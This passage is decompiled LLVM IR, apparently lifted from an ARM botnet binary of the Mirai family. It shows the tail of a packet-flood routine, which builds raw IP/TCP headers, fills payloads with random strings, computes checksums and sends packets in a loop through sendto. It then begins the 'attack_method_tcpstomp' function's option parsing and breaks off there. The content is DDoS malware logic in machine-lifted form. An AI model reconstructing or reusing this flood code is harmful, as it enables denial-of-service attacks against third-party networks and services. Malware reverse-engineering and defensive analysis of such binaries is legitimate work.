  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v3_aff4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_afc8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 23, 15, 16, 13, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
